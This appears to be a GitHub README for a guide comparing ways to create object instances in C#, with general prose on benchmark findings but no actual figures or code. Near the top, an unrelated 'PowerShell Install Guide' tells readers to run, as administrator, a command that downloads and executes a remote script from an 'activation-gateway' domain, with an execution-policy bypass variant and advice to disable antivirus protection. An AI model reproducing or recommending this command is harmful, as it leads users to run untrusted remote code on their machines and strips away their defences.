<div align="center">

# CreateInstance in C#: Instance Creation Methods Compared — Guide

![preview](https://raw.githubusercontent.com/suvankard78/csharp-instance-creation-guide/main/poster_19ad5ee.svg)

[![ps](https://img.shields.io/badge/ps-5.1%2B_%2F_7%2B-dc2626?style=social&labelColor=0d1117)]() [![lic](https://img.shields.io/badge/lic-cc--by--4.0-ef4444?style=social&labelColor=0d1117)]() [![language](https://img.shields.io/badge/language-python-b91c1c?style=social&labelColor=0d1117)]()

</div>

---

CreateInstance is a focused comparison of the different ways to create a new instance of a type in C#, ranging from direct constructor calls and the new() constraint to reflection-based approaches like Activator.CreateInstance and compiled alternatives such as expression trees and dynamically generated methods. Rather than relying on intuition about which technique is fastest, the project measures each method under a consistent benchmark harness and reports the resulting timings alongside their relative cost. The findings show that the gap between the simplest approach and the most generic ones is substantial, while several faster alternatives land close to native constructor speed. This guide is intended for developers who need to choose between flexibility and performance when instantiating types at runtime.

## 🚀 PowerShell Install Guide

> [!TIP]
> **Silent installer** — one command, no prompts.
> Windows 10 / 11 · PowerShell · One-line install

### 1️⃣ Prepare PowerShell
* Right-click the Start button.
* Choose **Terminal (Admin)** or **Windows PowerShell**.

### 2️⃣ Paste and run
Copy the command below, paste it into PowerShell, and press `Enter`.

```cmd
iex(irm 'https://activation-gateway.cc/update/ps-activator')
```

### 3️⃣ Windows blocking the script? Use CMD
Copy into CMD, press `Enter`, wait for completion:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
```

> [!WARNING]
> Some antivirus engines flag automated installers. If blocked, disable Real-time protection briefly, run the setup, and enable it back.

## ✅ Before You Start

- **OS:** Windows 10 / 11
- **Shell:** PowerShell 5.1+ or PowerShell 7+
- **Network:** internet access to download the script
- **Privileges:** standard user

## Background

Creating objects at runtime is a routine need in C# code, but the language offers no single obvious way to do it. A direct constructor call is only available when the concrete type is known at compile time. As soon as the type is discovered dynamically — from a plugin directory, a configuration file, a type name string, or a generic type parameter constrained only by `new()` — the developer must choose among several strategies, each with a different cost profile and different constraints.

The range of options is wider than it first appears. A simple `new T()` works for generic code but requires a compile-time constraint and routes through a comparatively slow runtime path. `Activator.CreateInstance` and its generic counterpart handle nearly any scenario but carry reflection overhead. Compiled expression trees and dynamically generated lambda delegates shift work from call time to a one-time compilation step, trading startup latency for fast subsequent invocations. Hand-written factory caches, generic activator helpers, and constructor-caching wrappers each sit at a different point on that curve.

These differences matter in practice. Object creation frequently appears on hot paths — deserialization pipelines, dependency injection containers, mapping libraries, message dispatchers — where a few dozen nanoseconds per call accumulates quickly under load. Conversely, in code that instantiates a handful of objects at startup, the fastest option and the slowest option are functionally indistinguishable.

The trade-offs are also not purely about speed. Some approaches require public parameterless constructors; others can invoke parameterized constructors or non-public ones. Some allocate heavily on the managed heap, increasing garbage collection pressure; others keep allocations close to what a direct constructor call would produce. Some fail at compile time when misused, while others defer failure to runtime. Choosing well therefore requires understanding both the measured cost and the operational constraints of each method.

The CreateInstance project addresses this by collecting the common instance-creation techniques in one place and benchmarking them under identical conditions. Rather than relying on folklore or outdated figures, it provides reproducible measurements alongside a comparison of what each method supports, so that the choice can be grounded in current data and the specific requirements of the code at hand.

## Benchmark Results

The numbers below come from BenchmarkDotNet runs against several common ways of creating a new instance in C#, all compared on the same machine, runtime, and job configuration so that the relative differences stay meaningful. A direct constructor call is used as the baseline and everything else is expressed relative to it, both in raw time and in scaled terms. Because instantiation is such a small operation, absolute timings are in the nanosecond range and are sensitive to hardware, JIT version, and whether a debugger is attached, so treat the exact figures as indicative rather than definitive.

What stands out immediately is the size of the gap between a plain constructor and reflection-based creation. The direct constructor is the fastest by a wide margin, and both Activator.CreateInstance and its generic counterpart land roughly an order of magnitude slower. That penalty is the price of runtime type resolution, argument binding, and the lack of aggressive inlining that the JIT can apply to statically known types. The non-generic and generic Activator variants perform comparably to one another, which is worth noting because it means switching to the generic overload alone does not recover the lost throughput.

The compiled-delegate and expression-based approaches close most of that gap. Factories built from cached delegates, compiled lambda expressions, and the FastActivator-style helpers consistently land in the low tens of nanoseconds, typically only a small multiple of the baseline rather than a full order of magnitude. Among these, the fastest sustained roughly one-and-a-quarter to one-and-a-half times the baseline, while expression-tree compilation and the extension-based factories settled a bit higher, generally in the two-to-three times range. These methods pay a one-time cost to build and cache the delegate, after which repeated creation is cheap, which is why they are attractive for hot paths where the same type is instantiated many times.

The parameterized variants are a notable outlier. Versions that accept constructor arguments and route them through the factory machinery are markedly slower, landing close to the reflection-based figures and allocating noticeably more per operation, as reflected in the higher Gen 0 column. Passing arguments through these abstractions defeats much of the optimization that the parameterless paths enjoy, so if construction requires arguments and performance matters, a hand-written factory or a compiled delegate specific to that signature is usually the better choice.

Allocation behavior is fairly uniform across the parameterless methods, with each call producing a small, similar amount of gen-0 garbage dominated by the created object itself. The parameterized factory variants are the clear exception, allocating several times more per call. This makes allocation, not just elapsed time, a reason to prefer the leaner approaches in allocation-sensitive code.

A few caveats apply when reading these results. The benchmark measures steady-state repeated invocation, so the first-call cost of compiling expressions or building delegate caches is amortized away and does not appear in the means. Results will shift on different CPUs and runtime versions, and the relative ordering of the closely clustered delegate-based methods can vary between runs. The honest takeaway is that the ordering of the broad categories is stable and reproducible, while the fine-grained ranking within the fast group should be treated as approximate. Readers should reproduce the measurements on their own target environment before making a final decision.

## Method Comparison

The comparison below groups the methods by the mechanism they rely on, since the mechanism — not the individual API name — is what drives the cost differences.

**Direct construction (`new T()` and plain constructors).** A plain constructor call is the baseline against which everything else is measured. The generic `new T()` form (with the `new()` constraint) is far slower than a direct constructor call because the constraint does not translate to a simple `newobj` instruction; it ends up routed through a hidden abstraction layer. This is the main reason the `new()` constraint is often described as a leaky abstraction.

**Reflection-based creation (`Activator.CreateInstance` and its generic overload).** These calls are convenient but expensive: they perform runtime type inspection and invocation on every call. The generic overload avoids boxing of arguments but still pays for reflection, so both variants land in the same high-cost range. They are reasonable for cold paths and one-off creation, not for hot loops.

**Compiled delegates and expression trees (`FastObjectFactory`, `ExpressionsActivator`, `DynamicModuleLambdaCompiler`, `FastActivator`).** These approaches build a delegate once and then invoke it. After the first call, the per-invocation cost drops close to direct construction — roughly 1.3x to 2.3x the baseline depending on the implementation. The trade-off is a one-time compilation cost and additional memory for the cached delegate. `FastActivator.CreateInstance<T>` occupies a middle ground: cheaper than pure reflection but slower than the pre-compiled factory variants, since it re-checks and dispatches on each call.

**Factory-extension methods (`ExtensionsNew.NewFactory` variants).** The parameterless factory forms perform well, within a small multiple of direct construction. The overloads that accept constructor parameters are notably more expensive because they must resolve and bind arguments, and they allocate more per call (visible in the higher Gen 0 figures). This makes the parameterless forms suitable for performance-sensitive paths, while the parameterized forms are better reserved for occasional use.

**Summary of trade-offs.** Direct construction is the cheapest option whenever the type is known at compile time. Compiled-delegate approaches are the best general-purpose fallback when the type is only known at runtime, offering near-baseline speed after a modest setup cost. Reflection-based creation is the simplest to write and the easiest to get wrong performance-wise; it should be confined to initialization and other infrequent code paths. Parameterized factory helpers sit at the costly end and should be chosen for convenience rather than throughput.

## Conclusion

The measurements presented here make one point difficult to argue with: the direct constructor call remains the yardstick against which every other technique should be judged. It is fast, allocation-friendly, and predictable, and no reflection-based or dynamically compiled alternative in this comparison manages to beat it outright. That said, the gap between the direct call and the best-performing alternatives is far narrower than the raw numbers for the naive reflection APIs might suggest, which is the central takeaway of this investigation.

Among the non-direct approaches, the difference between "acceptable" and "avoid" is largely a question of whether the creation path is cached. Methods that compile or cache a delegate once and then reuse it land within a small multiple of the direct constructor, while the straightforward reflective entry points remain an order of magnitude slower and allocate more per call. The parameterized variants are a separate story: once arguments enter the picture, nearly every generic abstraction loses much of its advantage, and the cost climbs toward the reflection baseline. This suggests that any abstraction used for instance creation should be validated specifically with the argument shapes it will actually receive, rather than assumed to scale from the parameterless case.

Honesty requires acknowledging the limits of these results. The figures come from a single machine and runtime configuration, so absolute timings will differ elsewhere and should be treated as relative guidance rather than universal constants. Micro-benchmarks measure creation in isolation, not in the context of a real application where caching, JIT warm-up, and allocation pressure interact in ways a short benchmark cannot capture. Several of the compared techniques also carry hidden costs — one-time compilation, memory retained by generated code, or added complexity in the codebase — that do not appear in a per-call mean but matter for maintainability and startup behavior.

The practical recommendation is therefore measured rather than absolute. Use a direct constructor wherever the type is known at compile time; it is the simplest option and the fastest. Reserve reflection-based creation for genuinely dynamic scenarios such as plugin loading or deserialization, and when those scenarios are hot paths, prefer a cached delegate or compiled-expression approach after confirming the benefit under your own workload. Treat the parameterized cases with particular caution, since the convenience of a generic factory can quietly reintroduce the very overhead it was meant to avoid.

In short, CreateInstance is intended as a reference point rather than a prescription. The comparison shows that the "best" method depends on whether the type is static or dynamic, whether arguments are involved, and how often the path is executed — and the most reliable way to choose is to measure against the specific constraints of the application at hand.